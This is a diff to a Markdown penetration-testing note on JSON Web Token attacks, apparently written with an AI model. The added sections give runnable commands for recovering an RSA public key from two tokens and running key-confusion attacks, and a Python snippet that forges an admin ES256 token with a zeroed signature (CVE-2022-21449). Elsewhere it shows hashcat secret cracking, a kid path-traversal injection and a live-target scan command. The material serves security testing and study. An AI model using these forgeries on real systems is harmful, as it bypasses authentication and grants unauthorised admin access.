@@ -1,12 +1,10 @@
 # JWT Attacks
 
-#JWT #Authentication #WebAppAttacks #APIAttacks
-
+#JWT #Authentication #WebAppAttacks #APIAttacks #AlgorithmConfusion #TokenForgery #jwt_tool #hashcat #BurpSuite
 
 ## What is this?
 
 JSON Web Token attacks — algorithm confusion (RS256→HS256), none algorithm, weak secret brute-force, kid injection, and header injection. Pairs with [[OAuth-OIDC-SAML]], [[Web Attacks]].
-
 
 ---
 
@@ -14,11 +12,12 @@ JSON Web Token attacks — algorithm confusion (RS256→HS256), none algorithm, 
 
 | Tool | Purpose |
 |---|---|
-| `jwt_tool` | Algorithm attacks, none alg, brute force, kid injection — `git clone https://github.com/ticarpi/jwt_tool` |
-| `Burp JWT Editor` | In-proxy JWT modification and signing (BApp Store extension) |
-| `hashcat` | Brute-force HS256/HS384/HS512 secrets — `hashcat -a 0 -m 16500 <jwt> wordlist.txt` |
-| `john` | Alternative secret cracking — hashcat 16500 is more reliable for JWTs; john's `HMAC-SHA256` format expects `data#hash`, not a bare token, so convert first |
-| `jwt.io` | Manual decode/inspect (offline use only for sensitive tokens) |
+| [[Tools/Web/jwt_tool\|jwt_tool]] | Algorithm attacks, none alg, brute force, kid injection |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | JWT Editor extension — in-proxy JWT modification and signing (BApp Store) |
+| [[Tools/Auth/hashcat\|hashcat]] | Brute-force HS256/HS384/HS512 secrets — `hashcat -a 0 -m 16500 <jwt> wordlist.txt` |
+| [[Tools/Auth/john the ripper\|john]] | Alternative secret cracking — hashcat 16500 is more reliable for JWTs; john's `HMAC-SHA256` format expects `data#hash`, not a bare token, so convert first |
+| [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) | Recover the RSA public key from two signed tokens when no JWKS is published |
+| [jwt.io](https://jwt.io) | Manual decode/inspect (offline use only for sensitive tokens) |
 
 ---
 
@@ -205,6 +204,69 @@ EOF
 python3 jwt_tool.py <token> -X k -pk pubkey.pem
 # -X k = key confusion attack
 ```
+
+### No JWKS Exposed? Recover the Public Key From Two Tokens
+
+Algorithm confusion is usually written off when the public key isn't published — but RSA leaks it. Given **two different tokens signed with the same key**, you can solve for the modulus `n` and reconstruct the public key without the server ever handing it over. This makes the attack viable against targets with no JWKS endpoint at all.
+
+```bash
+git clone https://github.com/silentsignal/rsa_sign2n
+cd rsa_sign2n/standalone
+
+# Feed it two tokens signed by the same key
+python3 jwt_forgery.py <token1> <token2>
+
+# Emits several candidate keys in different encodings (with/without trailing
+# newline, PEM vs DER, etc.) — implementations differ in what bytes they feed
+# to the HMAC, so try each candidate against the target
+ls *.pem
+```
+
+```bash
+# Then run the confusion attack with each candidate
+for k in *.pem; do
+  echo "== $k"
+  python3 jwt_tool.py <token> -X k -pk "$k"
+done
+```
+
+> [!tip] Collect the two tokens by simply logging in twice — different `iat`/`jti` values are enough, as long as the same signing key was used. Tokens from different users work too.
+
+> [!note] The tool deliberately emits multiple key encodings because the attack hinges on producing the *exact byte sequence* the server uses as its HMAC secret. A failure on one candidate says nothing about the others — work through all of them before concluding the target isn't vulnerable.
+
+---
+
+## Psychic Signatures (CVE-2022-21449) — ES256/384/512
+
+A flaw in Java's ECDSA verification (OpenJDK 15–18, Oracle Java SE, GraalVM) accepts a signature whose `r` and `s` values are both **zero** as valid for *any* message and *any* public key. Against a vulnerable Java backend, any token using `ES256`, `ES384`, or `ES512` can be forged outright — no key material, no brute force, no confusion trick.
+
+```bash
+# Craft a token with a zeroed signature
+python3 << 'EOF'
+import base64, json
+
+def b64url(d):
+    return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()
+
+header  = {"alg": "ES256", "typ": "JWT"}
+payload = {"sub": "1", "role": "admin", "iat": 1700000000}
+
+# ECDSA P-256 signature is r||s, 32 bytes each — all zeroes
+sig = base64.urlsafe_b64encode(b"\x00" * 64).rstrip(b"=").decode()
+print(f"{b64url(header)}.{b64url(payload)}.{sig}")
+EOF
+# ES384 → 96 zero bytes, ES512 → 132 zero bytes
+```
+
+**When it's worth trying:**
+
+| Signal | Where to look |
+|---|---|
+| Token header says `ES256`/`ES384`/`ES512` | Decode the JWT header — this is the precondition |
+| Backend is Java | `X-Powered-By`, error stack traces, `JSESSIONID` cookie, `.jsp`/`.do` paths |
+| JDK 15–18 | Version banners, dependency files, or an unpatched appliance |
+
+> [!note] Patched in the April 2022 CPU, so it's dead on anything maintained — but it survives on appliances and internal apps that pinned a JDK. Cheap to test: one request with a zeroed signature.
 
 ---
 
@@ -552,10 +614,16 @@ python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
 
 # Run all checks (playbook scan against a live target)
 python3 jwt_tool.py <token> -t "https://<target>/api/profile" -rh "Authorization: Bearer <token>" -M pb
+
+# No JWKS? recover the public key from two tokens, then try each candidate
+python3 jwt_forgery.py <token1> <token2>
+
+# Psychic signature (CVE-2022-21449) — ES* alg on a Java backend, 64 zero bytes
+python3 -c "import base64;print(base64.urlsafe_b64encode(b'\x00'*64).rstrip(b'=').decode())"
 ```
 
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
